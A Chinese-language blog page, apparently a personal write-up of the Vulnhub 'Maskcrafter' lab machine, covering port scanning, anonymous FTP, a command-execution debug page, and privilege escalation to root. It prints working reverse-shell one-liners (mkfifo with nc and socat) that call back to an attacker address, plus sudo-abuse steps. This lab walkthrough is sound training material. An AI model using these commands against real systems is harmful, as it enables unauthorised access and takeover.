@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>Vulnhub Maskcrafter - Josephine&#39;s Blog</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="Josephine" /><meta name="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.82 Host is up (0.00088s latency). 机器 IP 为 10.1.1.82。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.80.0 with theme even" />
+
+
+<link rel="canonical" href="https://bulletforkiller.github.io/post/vulnhub-maskcrafter/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="Vulnhub Maskcrafter" />
+<meta property="og:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.82 Host is up (0.00088s latency). 机器 IP 为 10.1.1.82。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://bulletforkiller.github.io/post/vulnhub-maskcrafter/" />
+<meta property="article:published_time" content="2021-07-01T18:13:30+08:00" />
+<meta property="article:modified_time" content="2021-07-01T18:13:30+08:00" />
+<meta itemprop="name" content="Vulnhub Maskcrafter">
+<meta itemprop="description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.82 Host is up (0.00088s latency). 机器 IP 为 10.1.1.82。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务">
+<meta itemprop="datePublished" content="2021-07-01T18:13:30+08:00" />
+<meta itemprop="dateModified" content="2021-07-01T18:13:30+08:00" />
+<meta itemprop="wordCount" content="1082">
+
+
+
+<meta itemprop="keywords" content="Vulnhub," />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Vulnhub Maskcrafter"/>
+<meta name="twitter:description" content="枚举 确定 IP 地址 使用 nmap 进行探活： 1 2 3 4 nmap -sn 10.1.1.0/24 Nmap scan report for 10.1.1.82 Host is up (0.00088s latency). 机器 IP 为 10.1.1.82。 端口扫描及服务枚举 进行全 TCP 端口扫描，同时枚举服务"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Josephine&#39;s Blog</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Josephine&#39;s Blog</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">Vulnhub Maskcrafter</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-07-01 </span>
+        <div class="post-category">
+            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"> 渗透测试 </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#枚举">枚举</a>
+      <ul>
+        <li><a href="#确定-ip-地址">确定 IP 地址</a></li>
+        <li><a href="#端口扫描及服务枚举">端口扫描及服务枚举</a></li>
+        <li><a href="#21-端口枚举">21 端口枚举</a></li>
+        <li><a href="#80-端口枚举">80 端口枚举</a></li>
+      </ul>
+    </li>
+    <li><a href="#initial-shell">Initial Shell</a></li>
+    <li><a href="#提权">提权</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="枚举">枚举</h1>
+<h2 id="确定-ip-地址">确定 IP 地址</h2>
+<p>使用 nmap 进行探活：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sn 10.1.1.0/24
+
+Nmap scan report <span class="k">for</span> 10.1.1.82
+Host is up <span class="o">(</span>0.00088s latency<span class="o">)</span>.</code></pre></td></tr></table>
+</div>
+</div>
+<p>机器 IP 为 <strong>10.1.1.82</strong>。</p>
+<h2 id="端口扫描及服务枚举">端口扫描及服务枚举</h2>
+<p>进行全 TCP 端口扫描，同时枚举服务和操作系统的信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -vv --reason -Pn -A --osscan-guess --version-all -p- 10.1.1.82
+
+PORT      STATE SERVICE  REASON         VERSION
+21/tcp    open  ftp      syn-ack ttl <span class="m">63</span> vsftpd 2.0.8 or later
+<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+<span class="p">|</span>_drwxr-xr-x    <span class="m">2</span> <span class="m">112</span>      <span class="m">115</span>          <span class="m">4096</span> Mar <span class="m">30</span>  <span class="m">2020</span> pub
+<span class="p">|</span> ftp-syst: 
+<span class="p">|</span>   STAT: 
+<span class="p">|</span> FTP server status:
+<span class="p">|</span>      Connected to 192.168.17.48
+<span class="p">|</span>      Logged in as ftp
+<span class="p">|</span>      TYPE: ASCII
+<span class="p">|</span>      No session bandwidth limit
+<span class="p">|</span>      Session timeout in seconds is <span class="m">300</span>
+<span class="p">|</span>      Control connection is plain text
+<span class="p">|</span>      Data connections will be plain text
+<span class="p">|</span>      At session startup, client count was <span class="m">1</span>
+<span class="p">|</span>      vsFTPd 3.0.3 - secure, fast, stable
+<span class="p">|</span>_End of status
+22/tcp    open  ssh      syn-ack ttl <span class="m">63</span> OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> 8f:1b:43:23:0a:24:8c:66:ad:3d:a2:b9:69:33:4d:d7 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span> ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPOB186djNS9H9MvH3jDIhmspsxbLqBGHFbweQ1s93NBeMeefnPMTlc8gP8HNASUtyPdSI/WRcBWfmXynlNTBAtGR5NWKl+Xge2GRini5o58ihxExsYEl7DCYjfYxaqp58VB0ZT6xh7OnHuWS32z/yzWHOJna4IJa45WWKnRdAcJ7qGvCvpAfq15WVFQZZBLdlMEG35PH2JMXRk1QkXUv8g4sycrX9M0GISWRIf+6B+pw3Gmk8hjzrRvKT4KP0b1nVR39L+caAGR6zIsmMAQP7zIgHETE/W+JoGcOl6WnABw7ewO2T3Xd17gSknUORYcQ+tuANRRNBA7WknGa4/mV5
+<span class="p">|</span>   <span class="m">256</span> 8a:2c:85:7c:2d:96:22:f6:98:f2:4a:b6:7a:88:df:23 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span> ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+i4sue0qx6LrWd7tsoaIgUo/81xVv5Tf+IOBl/I0sp6pWLhJ5bBctbxLdkACM7bhIODCF6QLimCmSSLhDTcjo<span class="o">=</span>
+<span class="p">|</span>   <span class="m">256</span> ac:a7:99:15:9c:bf:69:44:d9:c2:96:2a:8f:79:9b:6d <span class="o">(</span>ED25519<span class="o">)</span>
+<span class="p">|</span>_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIK19h0Jww5W47g5M4lxGuowM1yIZatJVNk3riwj1wG+B
+80/tcp    open  http     syn-ack ttl <span class="m">63</span> Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods: 
+<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
+<span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
+<span class="p">|</span>_/debug
+<span class="p">|</span>_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span> http-title: Maskcrafter<span class="o">(</span>TM<span class="o">)</span> Login Page
+<span class="p">|</span>_Requested resource was login.php
+111/tcp   open  rpcbind  syn-ack ttl <span class="m">63</span> 2-4 <span class="o">(</span>RPC <span class="c1">#100000)</span>
+<span class="p">|</span> rpcinfo: 
+<span class="p">|</span>   program version    port/proto  service
+<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/tcp   rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  2,3,4        111/udp   rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  3,4          111/tcp6  rpcbind
+<span class="p">|</span>   <span class="m">100000</span>  3,4          111/udp6  rpcbind
+<span class="p">|</span>   <span class="m">100003</span>  <span class="m">3</span>           2049/udp   nfs
+<span class="p">|</span>   <span class="m">100003</span>  <span class="m">3</span>           2049/udp6  nfs
+<span class="p">|</span>   <span class="m">100003</span>  3,4         2049/tcp   nfs
+<span class="p">|</span>   <span class="m">100003</span>  3,4         2049/tcp6  nfs
+<span class="p">|</span>   <span class="m">100005</span>  1,2,3      38731/udp6  mountd
+<span class="p">|</span>   <span class="m">100005</span>  1,2,3      42303/tcp6  mountd
+<span class="p">|</span>   <span class="m">100005</span>  1,2,3      47927/tcp   mountd
+<span class="p">|</span>   <span class="m">100005</span>  1,2,3      49700/udp   mountd
+<span class="p">|</span>   <span class="m">100021</span>  1,3,4      34685/tcp6  nlockmgr
+<span class="p">|</span>   <span class="m">100021</span>  1,3,4      37458/udp6  nlockmgr
+<span class="p">|</span>   <span class="m">100021</span>  1,3,4      40725/udp   nlockmgr
+<span class="p">|</span>   <span class="m">100021</span>  1,3,4      41789/tcp   nlockmgr
+<span class="p">|</span>   <span class="m">100227</span>  <span class="m">3</span>           2049/tcp   nfs_acl
+<span class="p">|</span>   <span class="m">100227</span>  <span class="m">3</span>           2049/tcp6  nfs_acl
+<span class="p">|</span>   <span class="m">100227</span>  <span class="m">3</span>           2049/udp   nfs_acl
+<span class="p">|</span>_  <span class="m">100227</span>  <span class="m">3</span>           2049/udp6  nfs_acl
+2049/tcp  open  nfs_acl  syn-ack ttl <span class="m">63</span> <span class="m">3</span> <span class="o">(</span>RPC <span class="c1">#100227)</span>
+41117/tcp open  mountd   syn-ack ttl <span class="m">63</span> 1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
+41789/tcp open  nlockmgr syn-ack ttl <span class="m">63</span> 1-4 <span class="o">(</span>RPC <span class="c1">#100021)</span>
+43911/tcp open  mountd   syn-ack ttl <span class="m">63</span> 1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
+47927/tcp open  mountd   syn-ack ttl <span class="m">63</span> 1-3 <span class="o">(</span>RPC <span class="c1">#100005)</span>
+Aggressive OS guesses: Linux 2.6.32 <span class="o">(</span>96%<span class="o">)</span>, Linux 2.6.32 or 3.10 <span class="o">(</span>95%<span class="o">)</span>, Linux 4.4 <span class="o">(</span>95%<span class="o">)</span>, Linux 2.6.32 - 2.6.35 <span class="o">(</span>94%<span class="o">)</span>, Linux 2.6.32 - 2.6.39 <span class="o">(</span>94%<span class="o">)</span>, Linux 4.0 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.11 - 4.1 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 3.8 <span class="o">(</span>92%<span class="o">)</span>, Linux 5.0 - 5.4 <span class="o">(</span>92%<span class="o">)</span>, Linux 2.6.18 <span class="o">(</span>92%<span class="o">)</span></code></pre></td></tr></table>
+</div>
+</div>
+<p>该机器运行着 vsftpd、openssh、apache 和 nfs 等服务。</p>
+<h2 id="21-端口枚举">21 端口枚举</h2>
+<p>nmap 的结果显示可以匿名登录，经过验证确实可以：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ftp 10.1.1.82
+
+Connected to 10.1.1.82.                                            
+<span class="m">220</span> Welcome to maskcrafter<span class="o">(</span>TM<span class="o">)</span> FTP service.                      
+Name <span class="o">(</span>10.1.1.82:ja<span class="o">)</span>: anonymous
+<span class="m">331</span> Please specify the password.
+Password:
+<span class="m">230</span> Login successful.
+Remote system <span class="nb">type</span> is UNIX.
+Using binary mode to transfer files.</code></pre></td></tr></table>
+</div>
+</div>
+<p>发现两个文件 NOTES.txt 和 cred.zip：</p>
+<p><img src="/images/2021-07-05/mc_ftp.webp" alt="mc_ftp"></p>
+<p>NOTES.txt:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">Dear Web Administrator,
+
+I&#39;ve got a few points to make:
+
+1.) Please choose a stronger password for /debug web-directory.
+Having a username as &#39;admin&#39; is already guessable but selecting a dictionary password is a big NO-NO.
+
+2.) Please revisit the SQL code to prevent SQL injections because the way it is now, it is absolutely terrible.
+Basically, we are hoping and praying that no hacker ever finds out about this.
+
+Regards,
+Root
+</code></pre></td></tr></table>
+</div>
+</div><p>cred.zip 有密码，暂时无法查看内部内容。</p>
+<h2 id="80-端口枚举">80 端口枚举</h2>
+<p>主页为一个登录页面：</p>
+<p><img src="/images/2021-07-05/mc_index.webp" alt="mc_index"></p>
+<p>robots.txt 内容如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">User-agent: *
+Disallow: /debug
+</code></pre></td></tr></table>
+</div>
+</div><p>访问 /debug，发现可以执行几个命令:</p>
+<p><img src="/images/2021-07-05/mc_debug.webp" alt="mc_debug"></p>
+<p>利用 burp 查看请求应答，发现可以执行任意命令：</p>
+<p><img src="/images/2021-07-05/mc_burp.webp" alt="mc_burp"></p>
+<h1 id="initial-shell">Initial Shell</h1>
+<p>经过探测，机器上存在 nc，配合 mkfifo 执行反弹 shell：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">rm -rf /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>bash -i &lt;/tmp/f <span class="p">|</span> nc 192.168.17.48 <span class="m">443</span> &gt;/tmp/f<span class="p">;</span>rm -rf /tmp/f</code></pre></td></tr></table>
+</div>
+</div>
+<p><img src="/images/2021-07-05/mc_rev.webp" alt="mc_rev"></p>
+<p>获取到 Initial Shell：</p>
+<p><img src="/images/2021-07-05/mc_initial.webp" alt="mc_initial"></p>
+<h1 id="提权">提权</h1>
+<p>首先从 www 目录下获取到数据库的凭据：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$connection</span> <span class="o">=</span> <span class="nx">mysqli_connect</span><span class="p">(</span><span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="s2">&#34;web&#34;</span><span class="p">,</span> <span class="s2">&#34;P@ssw0rdweb&#34;</span><span class="p">,</span> <span class="s2">&#34;mydatabase&#34;</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div>
+<p>从数据库中找到压缩包的密码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">+----+-------------+--------------+
+| id | password    | data_type    |
++----+-------------+--------------+
+| 1  | cred12345!! | zip password |
++----+-------------+--------------+
+</code></pre></td></tr></table>
+</div>
+</div><p>解压得到 cred.txt，从而获得的 userx 的密码 su 为 userx，发现其能执行 sudo，且 <strong>whatsmyid.sh</strong> 可被修改：</p>
+<p><img src="/images/2021-07-05/mc_sudo.webp" alt="mc_sudo"></p>
+<p>将 whatsmyid.sh 修改为如下内容：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span>
+bash -p</code></pre></td></tr></table>
+</div>
+</div>
+<p>sudo 运行以上脚本，成为 evdaez，继续查看 sudo：</p>
+<p><img src="/images/2021-07-05/mc_evdaez.webp" alt="mc_evdaez"></p>
+<p>利用 socat 反弹 shell：</p>
+<p><img src="/images/2021-07-05/mc_rev2.webp" alt="mc_rev2"></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo -u researcherx socat TCP4:192.168.17.48 EXEC:/bin/bash</code></pre></td></tr></table>
+</div>
+</div>
+<p>还是查看 sudo：</p>
+<p><img src="/images/2021-07-05/mc_rese.webp" alt="mc_rese"></p>
+<p>终于，参考 gtfobin，利用 dpkg 执行以下命令提权至 root：</p>
+<p><img src="/images/2021-07-05/mc_root.webp" alt="mc_root"></p>
+<h1 id="参考">参考</h1>
+<ol>
+<li><a href="https://gtfobins.github.io/gtfobins/dpkg/">dpkg</a></li>
+</ol>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Josephine</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+        2021-07-01
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="/tags/vulnhub/">Vulnhub</a>
+          </div>
+      <nav class="post-nav">
+        <a class="prev" href="/post/vulnhub-relevant/">
+            <i class="iconfont icon-left"></i>
+            <span class="prev-text nav-default">Vulnhub Relevant</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        <a class="next" href="/post/vulnhub-cybox/">
+            <span class="next-text nav-default">Vulnhub Cybox</span>
+            <span class="next-text nav-mobile">下一篇</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+  <a href="https://bulletforkiller.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2020 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>Josephine</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+
+
+
+
+
+
+</body>
+</html>
